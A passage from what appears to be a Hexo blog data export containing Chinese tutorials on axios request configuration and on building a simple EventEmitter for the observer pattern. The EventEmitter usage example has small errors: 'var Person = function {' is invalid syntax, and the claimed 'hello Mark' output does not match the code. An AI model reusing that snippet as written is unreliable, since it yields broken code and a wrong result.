&#123;</span><br><span class=\"line\">    host: <span class=\"string\">'127.0.0.1'</span>,</span><br><span class=\"line\">    port: <span class=\"number\">9000</span>,</span><br><span class=\"line\">    auth: &#123;</span><br><span class=\"line\">      username: <span class=\"string\">'mikeymike'</span>,</span><br><span class=\"line\">      password: <span class=\"string\">'rapunz3l'</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">  cancelToken: <span class=\"keyword\">new</span> CancelToken(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">cancel</span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>最常用的也就是前面的 <code>10</code> 个配置，而且意思都特别容易理解。<br>具体的用法可以参考<a href=\"https://github.com/axios/axios\">官方说明</a>和<a href=\"https://github.com/axios/axios/tree/master/examples\">examples</a>。</p>\n<h4 id=\"返回体\"><a href=\"#返回体\" class=\"headerlink\" title=\"返回体\"></a>返回体</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  data: &#123;&#125;, <span class=\"comment\">// 服务端对于请求返回的具体信息</span></span><br><span class=\"line\"></span><br><span class=\"line\">  status: <span class=\"number\">200</span>,<span class=\"comment\">// 服务端 http 的状态码</span></span><br><span class=\"line\"></span><br><span class=\"line\">  statusText: <span class=\"string\">'OK'</span>, <span class=\"comment\">// 服务端 http 文本的响应状态</span></span><br><span class=\"line\"></span><br><span class=\"line\">  headers: &#123;&#125;, <span class=\"comment\">// 响应头部</span></span><br><span class=\"line\"></span><br><span class=\"line\">  config: &#123;&#125;, <span class=\"comment\">// axios 请求时的配置信息</span></span><br><span class=\"line\"></span><br><span class=\"line\">  request: &#123;&#125; <span class=\"comment\">// 请求的详细信息(XMLHttpRequest)</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>由于内容实在太多，本文暂时就讲这么多。其它关于 <code>axios</code> 的方法的用法和说明都会在后文中讲解。</p>\n","site":{"data":{}},"excerpt":"<p>Axios是近年来备受推崇的一个网络请求库，它以基于Promise的方式封装了浏览器的XMLHttpRequest和服务器端node http请求，使得我们可以用es6推荐的异步方式处理网络请求。<br>","more":"</p>\n<h3 id=\"为什么用Axios\"><a href=\"#为什么用Axios\" class=\"headerlink\" title=\"为什么用Axios\"></a>为什么用Axios</h3><blockquote>\n<p>官方是这样介绍的：</p>\n<ul>\n<li>从浏览器创建XMLHttpRequest</li>\n<li>从node.js创建http请求</li>\n<li>支持Promise API</li>\n<li>转换请求与响应数据</li>\n<li>取消请求</li>\n<li>自动转换JSON数据</li>\n<li>支持客户端XSRF攻击防护</li>\n</ul>\n</blockquote>\n<p>扩展了诸多功能之后 <code>axios.min.js</code> 文件最终打包出来大小仅有 <code>13kb</code>。</p>\n<h3 id=\"配置说明\"><a href=\"#配置说明\" class=\"headerlink\" title=\"配置说明\"></a>配置说明</h3><p>官方给出了一份详尽的配置说明，供使用者自定义自己的使用方式。详情可以点击<a href=\"https://github.com/axios/axios\">这里</a>。</p>\n<h4 id=\"全局默认配置\"><a href=\"#全局默认配置\" class=\"headerlink\" title=\"全局默认配置\"></a>全局默认配置</h4><p><code>axios</code> 给出了3个全局的配置信息，如下：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">axios.defaults.baseURL = <span class=\"string\">'https://api.example.com'</span>;</span><br><span class=\"line\">axios.defaults.headers.common[<span class=\"string\">'Authorization'</span>] = AUTH_TOKEN;</span><br><span class=\"line\">axios.defaults.headers.post[<span class=\"string\">'Content-Type'</span>] = <span class=\"string\">'application/x-www-form-urlencoded'</span>;</span><br></pre></td></tr></table></figure></p>\n<p><strong>baseURL</strong><br>代表请求的地址，类似于 <code>host</code>。比如：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> baseUrl = <span class=\"string\">'https://api.github.com'</span></span><br><span class=\"line\">axios.defaults.baseURL = baseUrl;</span><br><span class=\"line\">axios.get(<span class=\"string\">'/user'</span>)</span><br><span class=\"line\">    .then(<span class=\"function\"><span class=\"params\">res</span> =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(res)</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\"><span class=\"comment\">// ------------ 与上面的写法作用相同 --------------//</span></span><br><span class=\"line\">axios.get(<span class=\"string\">'https://api.github.com/user'</span>)</span><br><span class=\"line\">    .then(<span class=\"function\"><span class=\"params\">res</span> =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(res)</span><br><span class=\"line\">    &#125;)</span><br></pre></td></tr></table></figure></p>\n<p>通过配置 <code>baseUrl</code> 可以简化请求地址。</p>\n<p><strong>Authorization</strong><br>授权信息，一般用于用户验证。如果没有设置，则请求是不会携带 <code>Authorization</code> 信息。</p>\n<p><strong>Content-Type</strong><br>请求默认的 <code>Content-Type</code> 设置为 <code>application/x-www-form-urlencoded</code>，可以在全局更改，也可以在 <code>拦截器</code> 和 <code>请求/响应预处理</code> 中设置(后文中会细说)。</p>\n<h4 id=\"请求默认配置\"><a href=\"#请求默认配置\" class=\"headerlink\" title=\"请求默认配置\"></a>请求默认配置</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  url: <span class=\"string\">'/user'</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">  method: <span class=\"string\">'get'</span>, <span class=\"comment\">// default</span></span><br><span class=\"line\"></span><br><span class=\"line\">  baseURL: <span class=\"string\">'https://some-domain.com/api/'</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">  transformRequest: [<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">data, headers</span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> data;</span><br><span class=\"line\">  &#125;],</span><br><span class=\"line\"></span><br><span class=\"line\">  transformResponse: [<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">data</span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> data;</span><br><span class=\"line\">  &#125;],</span><br><span class=\"line\"></span><br><span class=\"line\">  headers: &#123;<span class=\"string\">'X-Requested-With'</span>: <span class=\"string\">'XMLHttpRequest'</span>&#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">  params: &#123;</span><br><span class=\"line\">    ID: <span class=\"number\">12345</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">  paramsSerializer: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">params</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Qs.stringify(params, &#123;<span class=\"attr\">arrayFormat</span>: <span class=\"string\">'brackets'</span>&#125;)</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">  data: &#123;</span><br><span class=\"line\">    firstName: <span class=\"string\">'Fred'</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">  timeout: <span class=\"number\">1000</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">  withCredentials: <span class=\"literal\">false</span>, <span class=\"comment\">// default</span></span><br><span class=\"line\"></span><br><span class=\"line\">  adapter: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">config</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">/* ... */</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">  auth: &#123;</span><br><span class=\"line\">    username: <span class=\"string\">'janedoe'</span>,</span><br><span class=\"line\">    password: <span class=\"string\">'s00pers3cret'</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">  responseType: <span class=\"string\">'json'</span>, <span class=\"comment\">// default</span></span><br><span class=\"line\"></span><br><span class=\"line\">  xsrfCookieName: <span class=\"string\">'XSRF-TOKEN'</span>, <span class=\"comment\">// default</span></span><br><span class=\"line\"></span><br><span class=\"line\">  xsrfHeaderName: <span class=\"string\">'X-XSRF-TOKEN'</span>, <span class=\"comment\">// default</span></span><br><span class=\"line\"></span><br><span class=\"line\">  onUploadProgress: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">progressEvent</span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">  onDownloadProgress: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">progressEvent</span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">  maxContentLength: <span class=\"number\">2000</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">  validateStatus: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">status</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> status &gt;= <span class=\"number\">200</span> &amp;&amp; status &lt; <span class=\"number\">300</span>; <span class=\"comment\">// default</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">  maxRedirects: <span class=\"number\">5</span>, <span class=\"comment\">// default</span></span><br><span class=\"line\"></span><br><span class=\"line\">  httpAgent: <span class=\"keyword\">new</span> http.Agent(&#123; <span class=\"attr\">keepAlive</span>: <span class=\"literal\">true</span> &#125;),</span><br><span class=\"line\">  httpsAgent: <span class=\"keyword\">new</span> https.Agent(&#123; <span class=\"attr\">keepAlive</span>: <span class=\"literal\">true</span> &#125;),</span><br><span class=\"line\"></span><br><span class=\"line\">  proxy: &#123;</span><br><span class=\"line\">    host: <span class=\"string\">'127.0.0.1'</span>,</span><br><span class=\"line\">    port: <span class=\"number\">9000</span>,</span><br><span class=\"line\">    auth: &#123;</span><br><span class=\"line\">      username: <span class=\"string\">'mikeymike'</span>,</span><br><span class=\"line\">      password: <span class=\"string\">'rapunz3l'</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">  cancelToken: <span class=\"keyword\">new</span> CancelToken(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">cancel</span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>最常用的也就是前面的 <code>10</code> 个配置，而且意思都特别容易理解。<br>具体的用法可以参考<a href=\"https://github.com/axios/axios\">官方说明</a>和<a href=\"https://github.com/axios/axios/tree/master/examples\">examples</a>。</p>\n<h4 id=\"返回体\"><a href=\"#返回体\" class=\"headerlink\" title=\"返回体\"></a>返回体</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  data: &#123;&#125;, <span class=\"comment\">// 服务端对于请求返回的具体信息</span></span><br><span class=\"line\"></span><br><span class=\"line\">  status: <span class=\"number\">200</span>,<span class=\"comment\">// 服务端 http 的状态码</span></span><br><span class=\"line\"></span><br><span class=\"line\">  statusText: <span class=\"string\">'OK'</span>, <span class=\"comment\">// 服务端 http 文本的响应状态</span></span><br><span class=\"line\"></span><br><span class=\"line\">  headers: &#123;&#125;, <span class=\"comment\">// 响应头部</span></span><br><span class=\"line\"></span><br><span class=\"line\">  config: &#123;&#125;, <span class=\"comment\">// axios 请求时的配置信息</span></span><br><span class=\"line\"></span><br><span class=\"line\">  request: &#123;&#125; <span class=\"comment\">// 请求的详细信息(XMLHttpRequest)</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>由于内容实在太多，本文暂时就讲这么多。其它关于 <code>axios</code> 的方法的用法和说明都会在后文中讲解。</p>"},{"title":"EventEmitter","date":"2016-10-12T08:08:10.000Z","_content":"\n自己编写一个简单的 `EventEmitter` 实现 `观察者模式`。\n\n<!-- more -->\n\n### 观察者模式\n> 观察者模式面向的需求是：A对象（观察者）对B对象（被观察者）的某种变化高度敏感，需要在B变化的一瞬间做出反应。\n举个例子，新闻里喜闻乐见的警察抓小偷，警察需要在小偷伸手作案的时候实施抓捕。\n在这个例子里，警察是观察者、小偷是被观察者，警察需要时刻盯着小偷的一举一动，才能保证不会错过任何瞬间。\n程序里的观察者和这种真正的【观察】略有不同，观察者不需要时刻盯着被观察者(例如A不需要每隔1ms就检查一次B的状态)；\n二是采用注册(Register)或者成为订阅(Subscribe)的方式告诉被观察者：\n我需要你的某某状态，你要在它变化时通知我。采取这样被动的观察方式，既省去了反复检索状态的资源消耗，也能够得到最高的反馈速度。\n\n### 观察者模式的优缺点\n#### 优点\n* 观察者模式在被观察者和观察者之间建立一个抽象的耦合。被观察者角色所知道的只是一个具体观察者列表，每一个具体观察者都符合一个抽象观察者的接口。被观察者并不认识任何一个具体观察者，它只知道它们都有一个共同的接口。\n* 由于被观察者和观察者没有紧密地耦合在一起，因此它们可以属于不同的抽象化层次。如果被观察者和观察者都被扔到一起，那么这个对象必然跨越抽象化和具体化层次。\n* 观察者模式支持广播通讯。被观察者会向所有的登记过的观察者发出通知。\n\n#### 缺点\n* 如果一个被观察者对象有很多的直接和间接的观察者的话，将所有的观察者都通知到会花费很多时间。\n* 如果在被观察者之间有循环依赖的话，被观察者会触发它们之间进行循环调用，导致系统崩溃。\n* 如果对观察者的通知是通过另外的线程进行异步投递的话，系统必须保证投递是以自恰的方式进行的。\n* 虽然观察者模式可以随时使观察者知道所观察的对象发生了变化，但是观察者模式没有相应的机制使观察者知道所观察的对象是怎么发生变化的。\n\n### 实现方法\n\n```js\nfunction EventEmitter() {\n    this.events = {};\n}\n    //绑定事件函数\nEventEmitter.prototype.on = function(eventName, callback) {\n    this.events[eventName] = this.events[eventName] || [];\n    this.events[eventName].push(callback); // 1\n};\n    //触发事件函数\nEventEmitter.prototype.emit = function(eventName, _) {\n    var events = this.events[eventName],\n    args = Array.prototype.slice.call(arguments, 1), // 2\n    i, m;\n \n    if (!events) {\n        return;\n    }\n\n    for (i = 0, m = events.length; i < m; i++) {\n        events[i].apply(null, args); // 3\n    }\n};\n    // 删除事件函数\nEventEmitter.prototype.off = function (eventName) {\n    delete this.events[eventName]\n}\n```\n\n以上有3个注意点：\n1.`EventEmitter` 接收事件时是以事件名作为 `key` 执行函数作为 `value:array`。\n2.但用户触发 `emit` 时可以传递多个参数，所以将除 `事件名(arg[0])` 之外的参数视为传参，缓存供第 `3` 步时使用。\n3.遍历事件的执行函数 `value` 并将 `args` 传递给每一个事件。\n\n更多关于 `call` 和 `apply` 的介绍请参考[这里](https://developer.mozilla.org/en-US/)\n\n### 使用\n```js\n\nvar Person = function {\n\n}\n\nPerson.prototype = new EventEmitter()\n\nvar p = new Person()\n\np.on('hello', function () {\n    console.log('hello world')\n})\n\np.emit('hello') // -> hello world\n\n```\n\n传递参数时，可以直接在 `on` 执行函数中获取 `emit` 中传递的参数；\n```js\np.on('hello', function (name) {\n    console.log('hello' + name)\n})\n\np.emit('hello', 'Mark') // -> hello Mark\n\n```\n### 总结\n以上只是对观察者模式主体的一个简单实现，还有很多可以扩展的方法和优化的方案，这里我就不再继续写了。\n如果你想了解更加完整的实现方式可以参考 [EventEmitter2](https://github.com/asyncly/EventEmitter2)。\n","source":"_posts/EventEmitter.md","raw":"---\ntitle: EventEmitter\ndate: 2016-10-12 16:08:10\ntags: \n---\n\n自己编写一个简单的 `EventEmitter` 实现 `观察者模式`。\n\n<!-- more -->\n\n### 观察者模式\n> 观察者模式面向的需求是：A对象（观察者）对B对象（被观察者）的某种变化高度敏感，需要在B变化的一瞬间做出反应。\n举个例子，新闻里喜闻乐见的警察抓小偷，警察需要在小偷伸手作案的时候实施抓捕。\n在这个例子里，警察是观察者、小偷是被观察者，警察需要时刻盯着小偷的一举一动，才能保证不会错过任何瞬间。\n程序里的观察者和这种真正的【观察】略有不同，观察者不需要时刻盯着被观察者(例如A不需要每隔1ms就检查一次B的状态)；\n二是采用注册(Register)或者成为订阅(Subscribe)的方式告诉被观察者：\n我需要你的某某状态，你要在它变化时通知我。采取这样被动的观察方式，既省去了反复检索状态的资源消耗，也能够得到最高的反馈速度。\n\n### 观察者模式的优缺点\n#### 优点\n* 观察者模式在被观察者和观察者之间建立一个抽象的耦合。被观察者角色所知道的只是一个具体观察者列表，每一个具体观察者都符合一个抽象观察者的接口。被观察者并不认识任何一个具体观察者，它只知道它们都有一个共同的接口。\n* 由于被观察者和观察者没有紧密地耦合在一起，因此它们可以属于不同的抽象化层次。如果被观察者和观察者都被扔到一起，那么这个对象必然跨越抽象化和具体化层次。\n* 观察者模式支持广播通讯。被观察者会向所有的登记过的观察者发出通知。\n\n#### 缺点\n* 如果一个被观察者对象有很多的直接和间接的观察者的话，将所有的观察者都通知到会花费很多时间。\n* 如果在被观察者之间有循环依赖的话，被观察者会触发它们之间进行循环调用，导致系统崩溃。\n* 如果对观察者的通知是通过另外的线程进行异步投递的话，系统必须保证投递是以自恰的方式进行的。\n* 虽然观察者模式可以随时使观察者知道所观察的对象发生了变化，但是观察者模式没有相应的机制使观察者知道所观察的对象是怎么发生变化的。\n\n### 实现方法\n\n```js\nfunction EventEmitter() {\n    this.events = {};\n}\n    //绑定事件函数\nEventEmitter.prototype.on = function(eventName, callback) {\n    this.events[eventName] = this.events[eventName] || [];\n    this.events[eventName].push(callback); // 1\n};\n    //触发事件函数\nEventEmitter.prototype.emit = function(eventName, _) {\n    var events = this.events[eventName],\n    args = Array.prototype.slice.call(arguments, 1), // 2\n    i, m;\n \n    if (!events) {\n        return;\n    }\n\n    for (i = 0, m = events.length; i < m; i++) {\n        events[i].apply(null, args); // 3\n    }\n};\n    // 删除事件函数\nEventEmitter.prototype.off = function (eventName) {\n    delete this.events[eventName]\n}\n```\n\n以上有3个注意点：\n1.`EventEmitter` 接收事件时是以事件名作为 `key` 执行函数作为 `value:array`。\n2.但用户触发 `emit` 时可以传递多个参数，所以将除 `事件名(arg[0])` 之外的参数视为传参，缓存供第 `3` 步时使用。\n3.遍历事件的执行函数 `value` 并将 `args` 传递给每一个事件。\n\n更多关于 `call` 和 `apply` 的介绍请参考[这里](https://developer.mozilla.org/en-US/)\n\n### 使用\n```js\n\nvar Person = function {\n\n}\n\nPerson.prototype = new EventEmitter()\n\nvar p = new Person()\n\np.on('hello', function () {\n    console.log('hello world')\n})\n\np.emit('hello') // -> hello world\n\n```\n\n传递参数时，可以直接在 `on` 执行函数中获取 `emit` 中传递的参数；\n```js\np.on('hello', function (name) {\n    console.log('hello' + name)\n})\n\np.emit('hello', 'Mark') // -> hello Mark\n\n```\n### 总结\n以上只是对观察者模式主体的一个简单实现，还有很多可以扩展的方法和优化的方案，这里我就不再继续写了。\n如果你想了解更加完整的实现方式可以参考 [EventEmitter2](https://github.com/asyncly/EventEmitter2)。\n","slug":"EventEmitter","published":1,"updated":"2018-10-25T06:05:58.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjno6s7qc000102vs3ycbrpna","content":"<p>自己编写一个简单的 <code>EventEmitter</code> 实现 <code>观察者模式</code>。</p>\n<a id=\"more\"></a>\n<h3 id=\"观察者模式\"><a href=\"#观察者模式\" class=\"headerlink\" title=\"观察者模式\"></a>观察者模式</h3><blockquote>\n<p>观察者模式面向的需求是：A对象（观察者）对B对象（被观察者）的某种变化高度敏感，需要在B变化的一瞬间做出反应。<br>举个例子，新闻里喜闻乐见的警察抓小偷，警察需要在小偷伸手作案的时候实施抓捕。<br>在这个例子里，警察是观察者、小偷是被观察者，警察需要时刻盯着小偷的一举一动，才能保证不会错过任何瞬间。<br>程序里的观察者和这种真正的【观察】略有不同，观察者不需要时刻盯着被观察者(例如A不需要每隔1ms就检查一次B的状态)；<br>二是采用注册(Register)或者成为订阅(Subscribe)的方式告诉被观察者：<br>我需要你的某某状态，你要在它变化时通知我。采取这样被动的观察方式，既省去了反复检索状态的资源消耗，也能够得到最高的反馈速度。</p>\n</blockquote>\n<h3 id=\"观察者模式的优缺点\"><a href=\"#观察者模式的优缺点\" class=\"headerlink\" title=\"观察者模式的优缺点\"></a>观察者模式的优缺点</h3><h4 id=\"优点\"><a href=\"#优点\" class=\"headerlink\" title=\"优点\"></a>优点</h4><ul>\n<li>观察者模式在被观察者和观察者之间建立一个抽象的耦合。被观察者角色所知道的只是一个具体观察者列表，每一个具体观察者都符合一个抽象观察者的接口。被观察者并不认识任何一个具体观察者，它只知道它们都有一个共同的接口。</li>\n<li>由于被观察者和观察者没有紧密地耦合在一起，因此它们可以属于不同的抽象化层次。如果被观察者和观察者都被扔到一起，那么这个对象必然跨越抽象化和具体化层次。</li>\n<li>观察者模式支持广播通讯。被观察者会向所有的登记过的观察者发出通知。</li>\n</ul>\n<h4 id=\"缺点\"><a href=\"#缺点\" class=\"headerlink\" title=\"缺点\"></a>缺点</h4><ul>\n<li>如果一个被观察者对象有很多的直接和间接的观察者的话，将所有的观察者都通知到会花费很多时间。</li>\n<li>如果在被观察者之间有循环依赖的话，被观察者会触发它们之间进行循环调用，导致系统崩溃。</li>\n<li>如果对观察者的通知是通过另外的线程进行异步投递的话，系统必须保证投递是以自恰的方式进行的。</li>\n<li>虽然观察者模式可以随时使观察者知道所观察的对象发生了变化，但是观察者模式没有相应的机制使观察者知道所观察的对象是怎么发生变化的。</li>\n</ul>\n<h3 id=\"实现方法\"><a href=\"#实现方法\" class=\"headerlink\" title=\"实现方法\"></a>实现方法</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">EventEmitter</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.events = &#123;&#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">    <span class=\"comment\">//绑定事件函数</span></span><br><span class=\"line\">EventEmitter.prototype.on = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">eventName, callback</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.events[eventName] = <span class=\"keyword\">this</span>.events[eventName] || [];</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.events[eventName].push(callback); <span class=\"comment\">// 1</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">    <span class=\"comment\">//触发事件函数</span></span><br><span class=\"line\">EventEmitter.prototype.emit = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">eventName, _</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> events = <span class=\"keyword\">this</span>.events[eventName],</span><br><span class=\"line\">    args = <span class=\"built_in\">Array</span>.prototype.slice.call(<span class=\"built_in\">arguments</span>, <span class=\"number\">1</span>), <span class=\"comment\">// 2</span></span><br><span class=\"line\">    i, m;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!events) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>, m = events.length; i &lt; m; i++) &#123;</span><br><span class=\"line\">        events[i].apply(<span class=\"literal\">null</span>, args); <span class=\"comment\">// 3</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">    <span class=\"comment\">// 删除事件函数</span></span><br><span class=\"line\">EventEmitter.prototype.off = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">eventName</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">delete</span> <span class=\"keyword\">this</span>.events[eventName]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>以上有3个注意点：<br>1.<code>EventEmitter</code> 接收事件时是以事件名作为 <code>key</code> 执行函数作为 <code>value:array</code>。<br>2.但用户触发 <code>emit</code> 时可以传递多个参数，所以将除 <code>事件名(arg[0])</code> 之外的参数视为传参，缓存供第 <code>3</code> 步时使用。<br>3.遍历事件的执行函数 <code>value</code> 并将 <code>args</code> 传递给每一个事件。</p>\n<p>更多关于 <code>call</code> 和 <code>apply</code> 的介绍请参考<a href=\"https://developer.mozilla.org/en-US/\" target=\"_blank\" rel=\"noopener\">这里</a></p>\n<h3 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> Person = <span class=\"function\"><span class=\"keyword\">function</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Person.prototype = <span class=\"keyword\">new</span> EventEmitter()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> p = <span 